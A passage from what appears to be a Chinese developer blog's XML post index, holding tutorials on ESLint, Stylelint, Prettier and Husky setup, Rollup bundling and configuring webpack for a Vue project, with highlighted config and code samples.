punctuation">:</span> <span class="token punctuation">{</span>        <span class="token function">cityDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token keyword">this</span><span class="token punctuation">.</span>$route<span class="token punctuation">.</span>meta<span class="token punctuation">.</span>cityDefault<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">,</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 前端路由 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>规范化标准ESLint</title>
      <link href="2020/09/10/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-%E8%A7%84%E8%8C%83%E5%8C%96%E6%A0%87%E5%87%86ESLint/"/>
      <url>2020/09/10/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-%E8%A7%84%E8%8C%83%E5%8C%96%E6%A0%87%E5%87%86ESLint/</url>
      
        <content type="html"><![CDATA[<h2 id="ESLint-安装与配置"><a href="#ESLint-安装与配置" class="headerlink" title="ESLint 安装与配置"></a>ESLint 安装与配置</h2><p>安装：<code>npm init --yes</code>，<code>npm intall eslint --save-dev</code></p><p>配置：<code>eslint --init</code>，此时会有一些问题，按需回答即可，一般选用 Standard 规范，安装一些依赖之后</p><p>使用<code>eslint foo.js</code>检查目标文件即可</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// .eslintrc.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  env<span class="token punctuation">:</span> <span class="token punctuation">{</span>    browser<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 运行环境 browser/node/commonjs等，可以同时使用</span>    es6<span class="token punctuation">:</span> <span class="token boolean">false</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token keyword">extends</span><span class="token punctuation">:</span> <span class="token punctuation">[</span> <span class="token comment" spellcheck="true">// 继承公共配置</span>    <span class="token string">'standard'</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  parserOptions<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 语法解析器，只是检测语法，env中的 es6 设置了 false，还是不可用</span>    ecmaVersion<span class="token punctuation">:</span> <span class="token number">2015</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  rules<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 校验规则</span>    <span class="token string">'no-alert'</span><span class="token punctuation">:</span> <span class="token string">"error"</span> <span class="token comment" spellcheck="true">// 有 off/warn/error 选项</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  globals<span class="token punctuation">:</span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// 声明可以使用的全局成员</span>    <span class="token string">"jQuery"</span><span class="token punctuation">:</span> <span class="token string">"readonly"</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="配置注释"><a href="#配置注释" class="headerlink" title="配置注释"></a>配置注释</h2><blockquote><p>standard 标准不支持 模板字符串语法，但是在项目中某一行我还是想用一下怎么办，可以通过配置注释</p><p>禁用规则：no-template-curly-in-string</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> str1 <span class="token operator">=</span> <span class="token string">'${name} is a coder'</span> <span class="token comment" spellcheck="true">// eslint-disable-line no-template-curly-in-string</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>str1<span class="token punctuation">)</span></code></pre><h2 id="ESLint-结合自动化工具"><a href="#ESLint-结合自动化工具" class="headerlink" title="ESLint 结合自动化工具"></a>ESLint 结合自动化工具</h2><h4 id="ESLint-结合-gulp"><a href="#ESLint-结合-gulp" class="headerlink" title="ESLint 结合 gulp"></a>ESLint 结合 gulp</h4><p>在已经配置好 gulp 的项目中安装<code>gulp-eslint</code>：<code>yarn add gulp-eslint --save-dev</code></p><p>初始化<code>.eslintrc.js</code>配置文件</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// gulpfile.js</span><span class="token keyword">const</span> script <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  <span class="token keyword">return</span> <span class="token function">src</span><span class="token punctuation">(</span><span class="token string">'src/assets/scripts/*.js'</span><span class="token punctuation">,</span> <span class="token punctuation">{</span> base<span class="token punctuation">:</span> <span class="token string">'src'</span> <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token function">eslint</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true">// 如果只加入这一行只会检查错误，而不会抛出错误</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span>eslint<span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span>eslint<span class="token punctuation">.</span><span class="token function">failAfterError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>plugins<span class="token punctuation">.</span><span class="token function">babel</span><span class="token punctuation">(</span><span class="token punctuation">{</span> presets<span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">'@babel/preset-env'</span><span class="token punctuation">]</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span><span class="token function">dest</span><span class="token punctuation">(</span><span class="token string">'temp'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">.</span><span class="token function">pipe</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">reload</span><span class="token punctuation">(</span><span class="token punctuation">{</span> stream<span class="token punctuation">:</span> <span class="token boolean">true</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">}</span></code></pre><h4 id="ESLint-结合-webpack"><a href="#ESLint-结合-webpack" class="headerlink" title="ESLint 结合 webpack"></a>ESLint 结合 webpack</h4><p>安装<code>eslint-loader</code>，初始化<code>.eslintrc.js</code>配置文件</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// webpack.config.js</span><span class="token keyword">const</span> HtmlWebpackPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'html-webpack-plugin'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'production'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span> <span class="token punctuation">{</span>    rules<span class="token punctuation">:</span> <span class="token punctuation">[</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.js$/</span><span class="token punctuation">,</span>         exclude<span class="token punctuation">:</span> <span class="token regex">/node_modules/</span><span class="token punctuation">,</span>         use<span class="token punctuation">:</span> <span class="token string">'babel-loader'</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.js$/</span><span class="token punctuation">,</span>         exclude<span class="token punctuation">:</span> <span class="token regex">/node_modules/</span><span class="token punctuation">,</span>         use<span class="token punctuation">:</span> <span class="token string">'eslint-loader'</span><span class="token punctuation">,</span>        enfore<span class="token punctuation">:</span> <span class="token string">'pre'</span> <span class="token comment" spellcheck="true">// 优先级最高</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/\.css$/</span><span class="token punctuation">,</span>         use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token keyword">new</span> <span class="token class-name">HtmlWebpackPlugin</span><span class="token punctuation">(</span><span class="token punctuation">{</span>      template<span class="token punctuation">:</span> <span class="token string">'src/index.html'</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><blockquote><p>vue-cli 在安装过程中有选项会自动集成 eslint 配置</p></blockquote><h3 id="eslint-检查-TypeScript"><a href="#eslint-检查-TypeScript" class="headerlink" title="eslint 检查 TypeScript"></a>eslint 检查 TypeScript</h3><ul><li>eslint 初始化时选择 TypeScript</li></ul><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// .eslintrc.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  env<span class="token punctuation">:</span> <span class="token punctuation">{</span>    browser<span class="token punctuation">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>    es2020<span class="token punctuation">:</span> <span class="token boolean">true</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  <span class="token keyword">extends</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">'standard'</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  parser<span class="token punctuation">:</span> <span class="token string">'@typescript-eslint/parser'</span><span class="token punctuation">,</span>  parserOptions<span class="token punctuation">:</span> <span class="token punctuation">{</span>    ecmaVersion<span class="token punctuation">:</span> <span class="token number">11</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token string">'@typescript-eslint'</span>  <span class="token punctuation">]</span><span class="token punctuation">,</span>  rules<span class="token punctuation">:</span> <span class="token punctuation">{</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><h2 id="Stylelint"><a href="#Stylelint" class="headerlink" title="Stylelint"></a>Stylelint</h2><ul><li>提供默认的代码检查规则</li><li>提供CLI工具，快速调用</li><li>通过插件支持Sass，Less，PostCSS</li><li>支持 Gulp 或 Webpack 集成</li></ul><p>安装 stylelint ：<code>yarn add stylelint -D</code></p><p>安装配置模块：<code>stylelint-config-standard</code></p><p>sass配置模块：<code>stylelint-config-sass-guidelines</code></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// .stylelintrc.js</span>modules<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>    <span class="token keyword">extends</span><span class="token punctuation">:</span> <span class="token punctuation">[</span><span class="token string">"stylelint-config-standard"</span><span class="token punctuation">,</span> <span class="token string">"stylelint-config-sass-guidelines"</span><span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><p>执行检查：<code>stylelint ./index.sass</code></p><h2 id="Prettier"><a href="#Prettier" class="headerlink" title="Prettier"></a>Prettier</h2><p>安装：<code>yarn add prettier -D</code></p><p>运行：<code>prettier style.css --write</code>可以自动将格式化后的文件覆盖源文件</p><h2 id="Git-Hooks"><a href="#Git-Hooks" class="headerlink" title="Git Hooks"></a>Git Hooks</h2><ul><li>Git Hooks也称之为 git 钩子，每个钩子都对应一个任务（commit/push）</li><li>通过 shell 脚本可以编写钩子任务触发时要具体执行的操作</li></ul><p><code>.git/hooks/pre-commit.sample</code>为<code>commit</code>之前的钩子函数，可以新建一个<code>pre-commit</code>文件写一些操作</p><p><code>Husky</code>可以实现<code>Git Hooks</code>的使用需求</p><p> 安装：<code>yarn add Husky -D</code></p><pre class=" language-json"><code class="language-json">// 在package.json中配置<span class="token punctuation">{</span>    <span class="token property">"husky"</span><span class="token operator">:</span> <span class="token punctuation">{</span>        <span class="token property">"hooks"</span><span class="token operator">:</span> <span class="token punctuation">{</span>            <span class="token property">"pre-commit"</span><span class="token operator">:</span> <span class="token string">"eslint ./index.js"</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>   <span class="token punctuation">}</span></code></pre><p>此外还有<code>lint-staged</code>模块等</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Rollup</title>
      <link href="2020/09/10/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-Rollup/"/>
      <url>2020/09/10/%E5%89%8D%E7%AB%AF%E5%B7%A5%E7%A8%8B%E5%8C%96-Rollup/</url>
      
        <content type="html"><![CDATA[<h2 id="Rollup快速上手"><a href="#Rollup快速上手" class="headerlink" title="Rollup快速上手"></a>Rollup快速上手</h2><p>举例：src 目录下有如下三个文件</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// messages.js</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  hi<span class="token punctuation">:</span> <span class="token string">'Hey Guys, I am zce~'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// logger.js</span><span class="token keyword">export</span> <span class="token keyword">const</span> log <span class="token operator">=</span> msg <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'---------- INFO ----------'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--------------------------'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">export</span> <span class="token keyword">const</span> error <span class="token operator">=</span> msg <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'---------- ERROR ----------'</span><span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span>  console<span class="token punctuation">.</span><span class="token function">error</span><span class="token punctuation">(</span><span class="token string">'---------------------------'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// index.js</span><span class="token comment" spellcheck="true">// 导入模块成员</span><span class="token keyword">import</span> <span class="token punctuation">{</span> log <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./logger'</span><span class="token keyword">import</span> messages <span class="token keyword">from</span> <span class="token string">'./messages'</span><span class="token comment" spellcheck="true">// 使用模块成员</span><span class="token keyword">const</span> msg <span class="token operator">=</span> messages<span class="token punctuation">.</span>hi<span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span></code></pre><p>安装 Rollup：<code>yarn add rollup --dev</code></p><p>执行打包命令：<code>yarn rollup ./src/index.js --format iife --file dist/bundle.js</code></p><p>Rollup会自动执行<code>tree shaking</code>，去除无效代码</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// bundle.js</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token string">'use strict'</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> log <span class="token operator">=</span> msg <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'---------- INFO ----------'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'--------------------------'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token keyword">var</span> messages <span class="token operator">=</span> <span class="token punctuation">{</span>    hi<span class="token punctuation">:</span> <span class="token string">'Hey Guys, I am zce~'</span>  <span class="token punctuation">}</span><span class="token punctuation">;</span>  <span class="token comment" spellcheck="true">// 导入模块成员</span>  <span class="token comment" spellcheck="true">// 使用模块成员</span>  <span class="token keyword">const</span> msg <span class="token operator">=</span> messages<span class="token punctuation">.</span>hi<span class="token punctuation">;</span>  <span class="token function">log</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><h2 id="rollup配置文件"><a href="#rollup配置文件" class="headerlink" title="rollup配置文件"></a>rollup配置文件</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// rollup.config.js</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  input<span class="token punctuation">:</span> <span class="token string">'src/index.js'</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// 入口</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    file<span class="token punctuation">:</span> <span class="token string">'dist/bundle.js'</span><span class="token punctuation">,</span>    format<span class="token punctuation">:</span> <span class="token string">'iife'</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>运行命令：<code>yarn rollup --config rollup.config.js</code></p><h2 id="Rollup使用插件"><a href="#Rollup使用插件" class="headerlink" title="Rollup使用插件"></a>Rollup使用插件</h2><p>安装可以导入 json 的插件：<code>yarn add rollup-plugin-json --dev</code></p><pre class=" language-js"><code class="language-js"><span class="token keyword">import</span> json <span class="token keyword">from</span> <span class="token string">'rollup-plugin-json'</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  input<span class="token punctuation">:</span> <span class="token string">'src/index.js'</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    file<span class="token punctuation">:</span> <span class="token string">'dist/bundle.js'</span><span class="token punctuation">,</span>    format<span class="token punctuation">:</span> <span class="token string">'iife'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  plugins<span class="token punctuation">:</span> <span class="token punctuation">[</span>    <span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true">// 调用的结果</span>  <span class="token punctuation">]</span><span class="token punctuation">}</span></code></pre><h3 id="Rollup-加载-node-modules-中的-NPM-模块"><a href="#Rollup-加载-node-modules-中的-NPM-模块" class="headerlink" title="Rollup 加载 node_modules 中的 NPM 模块"></a>Rollup 加载 node_modules 中的 NPM 模块</h3><p><code>yarn add rollup-plugin-node-resolve --dev</code>，配置同上</p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// index.js</span><span class="token comment" spellcheck="true">// 导入模块成员</span><span class="token keyword">import</span> _ <span class="token keyword">from</span> <span class="token string">'lodash-es'</span><span class="token keyword">import</span> <span class="token punctuation">{</span> log <span class="token punctuation">}</span> <span class="token keyword">from</span> <span class="token string">'./logger'</span><span class="token comment" spellcheck="true">// 使用模块成员</span><span class="token function">log</span><span class="token punctuation">(</span>_<span class="token punctuation">.</span><span class="token function">camelCase</span><span class="token punctuation">(</span><span class="token string">'hello world'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><blockquote><p>Rollup 默认只能使用 ES Modules模块，所以要导入 lodash-es，不能导入原本的 lodash</p></blockquote><h3 id="Rollup-加载-CommonJS"><a href="#Rollup-加载-CommonJS" class="headerlink" title="Rollup 加载 CommonJS"></a>Rollup 加载 CommonJS</h3><blockquote><p>因为依旧很多第三方模块使用 ComminJS 规范，所以需要插件处理</p></blockquote><p><code>yarn add rollup-plugin-commonjs --dev</code></p><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 自己写一个 CommonJS 规范的模块 cjs-module.js</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  foo<span class="token punctuation">:</span> <span class="token string">'bar'</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// index.js</span><span class="token keyword">import</span> cjs <span class="token keyword">from</span> <span class="token string">'./cjs-module'</span></code></pre><h2 id="代码拆分"><a href="#代码拆分" class="headerlink" title="代码拆分"></a>代码拆分</h2><pre class=" language-js"><code class="language-js"><span class="token comment" spellcheck="true">// 动态导入</span><span class="token keyword">import</span><span class="token punctuation">(</span><span class="token string">'./logger'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">{</span> log <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token punctuation">{</span> <span class="token comment" spellcheck="true">// import('./logger')返回promise，解构提取log方法</span>  <span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'code splitting~'</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><blockquote><p>使用代码拆分不能用 iife 格式，应该使用 AMD 或者 CommonJS 规范，而在浏览器端只能使用 AMD 规范</p></blockquote><pre class=" language-JS"><code class="language-JS">export default {  input: 'src/index.js',  output: {    dir: 'dist', // 多个文件，使用 dir    format: 'amd'  }}</code></pre><h3 id="多入口打包"><a href="#多入口打包" class="headerlink" title="多入口打包"></a>多入口打包</h3><pre class=" language-js"><code class="language-js"><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token punctuation">{</span>  input<span class="token punctuation">:</span> <span class="token punctuation">{</span>    foo<span class="token punctuation">:</span> <span class="token string">'src/index.js'</span><span class="token punctuation">,</span>  <span class="token comment" spellcheck="true">// 两个入口</span>    bar<span class="token punctuation">:</span> <span class="token string">'src/album.js'</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>    dir<span class="token punctuation">:</span> <span class="token string">'dist'</span><span class="token punctuation">,</span>    format<span class="token punctuation">:</span> <span class="token string">'amd'</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// 最后在 dist 目录下生成3个文件，foo.js，bar.js，和公共部分的js</span></code></pre><pre class=" language-html"><code class="language-html">  <span class="token comment" spellcheck="true">&lt;!-- AMD 标准格式的输出 bundle 不能直接引用 --></span>  <span class="token comment" spellcheck="true">&lt;!-- &lt;script src="foo.js">&lt;/script> --></span>  <span class="token comment" spellcheck="true">&lt;!-- 需要 Require.js 这样的库 --></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://unpkg.com/requirejs@2.3.6/require.js<span class="token punctuation">"</span></span> <span class="token attr-name">data-main</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>foo.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token script language-javascript"></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></code></pre><h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><ul><li>输出结果更加扁平</li><li>自动移除未引用代码</li><li>打包结果依然完全可读</li></ul><hr><ul><li>加载非 ESM 的第三方模块比较复杂</li><li>模块最终都被打包到一个函数中，无法实现 HMR</li><li>浏览器环境中，代码拆分功能依赖 AMD 库</li></ul><hr><p>开发应用程序使用 webpack，开发一个框架或者类库使用 Rollup</p>]]></content>
      
      
      <categories>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webpack（五）</title>
      <link href="2020/09/08/webpack-webpack%EF%BC%88%E4%BA%94%EF%BC%89/"/>
      <url>2020/09/08/webpack-webpack%EF%BC%88%E4%BA%94%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<ul><li>使用webpack打包一个vue项目</li><li>安装 loader 和 plugin</li><li>配置 webpack.dev.js</li><li>配置 webpack.prod.js</li><li>merge</li><li>配置eslint</li></ul><h2 id="使用-webpack-打包一个-vue-项目"><a href="#使用-webpack-打包一个-vue-项目" class="headerlink" title="使用 webpack 打包一个 vue 项目"></a>使用 webpack 打包一个 vue 项目</h2><blockquote><p>首先安装一些必要的 loader 和 plugin</p></blockquote><ul><li>webpack，webpack-cli：webpack工具</li><li>vue，vue-loader，vue-template-compiler：处理 .vue 文件</li><li>less，less-loader，css-loader，style-loader：处理样式</li><li>url-loader，file-loader：处理图片等文件</li><li>eslint-loader：代码标准化</li><li>babel-loader    @babel/core    @babel/preset-env：babel处理 es6</li><li><p>clean-webpack-plugin：删除 dist 目录</p></li><li><p>html-webpack-plugin：生成自动引用打包后的 js 的 html 文件</p></li><li>copy-webpack-plugin：可以用来拷贝 public 目录</li><li>webpack-dev-server：浏览器自动编译刷新</li><li>webpack-merge：合并配置文件</li><li>sourcemap：映射源文件</li></ul><h2 id="配置-webpack-dev-js"><a href="#配置-webpack-dev-js" class="headerlink" title="配置 webpack.dev.js"></a>配置 webpack.dev.js</h2><p>首先写一下入口，出口，处理 vue 和 样式的配置</p><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 入口</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>     filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>     path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token punctuation">,</span>  module<span class="token punctuation">:</span><span class="token punctuation">{</span>    rules<span class="token punctuation">:</span><span class="token punctuation">[</span>      <span class="token punctuation">{</span>         test<span class="token punctuation">:</span> <span class="token regex">/\.vue$/</span><span class="token punctuation">,</span>         use<span class="token punctuation">:</span> <span class="token string">'vue-loader'</span>       <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.css$/</span><span class="token punctuation">,</span>   <span class="token comment" spellcheck="true">// 处理css</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.less$/</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 处理sass</span>        use<span class="token punctuation">:</span> <span class="token punctuation">[</span>          <span class="token string">'style-loader'</span><span class="token punctuation">,</span>          <span class="token string">'css-loader'</span><span class="token punctuation">,</span>          <span class="token string">'less-loader'</span>        <span class="token punctuation">]</span>      <span class="token punctuation">}</span><span class="token punctuation">,</span>      <span class="token punctuation">{</span>        test<span class="token punctuation">:</span> <span class="token regex">/.png$/</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 处理图片</span>        use<span class="token punctuation">:</span> <span class="token punctuation">{</span>          loader<span class="token punctuation">:</span> <span class="token string">'url-loader'</span><span class="token punctuation">,</span>           options<span class="token punctuation">:</span> <span class="token punctuation">{</span>            limit<span class="token punctuation">:</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token comment" spellcheck="true">// 10 KB</span>          <span class="token punctuation">}</span>        <span class="token punctuation">}</span>      <span class="token punctuation">}</span>    <span class="token punctuation">]</span>  <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p>然后在<code>package.json</code>中配置一下<code>scripts</code></p><blockquote><p> “serve”: “webpack –config webpack.dev.js”</p></blockquote><p>运行<code>npm run server</code>后报错：</p><blockquote><p>vue-loader was used without the corresponding plugin</p><p>原来是Vue-loader在15.*之后的版本都是需要伴随 VueLoaderPlugin的,</p></blockquote><pre class=" language-js"><code class="language-js"><span class="token keyword">const</span> path <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'path'</span><span class="token punctuation">)</span><span class="token keyword">const</span> VueLoaderPlugin <span class="token operator">=</span> <span class="token function">require</span><span class="token punctuation">(</span><span class="token string">'vue-loader/lib/plugin'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>module<span class="token punctuation">.</span>exports <span class="token operator">=</span> <span class="token punctuation">{</span>  mode<span class="token punctuation">:</span> <span class="token string">'none'</span><span class="token punctuation">,</span>  entry<span class="token punctuation">:</span> <span class="token string">'./src/main.js'</span><span class="token punctuation">,</span> <span class="token comment" spellcheck="true">// 入口</span>  output<span class="token punctuation">:</span> <span class="token punctuation">{</span>     filename<span class="token punctuation">:</span> <span class="token string">'bundle.js'</span><span class="token punctuation">,</span>     path<span class="token punctuation">:</span> path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname<span class="token punctuation">,</span> <span class="token string">'dist'</span><span class="token punctuation">)</span>  <span class="token punctuation">}</span><span class="token 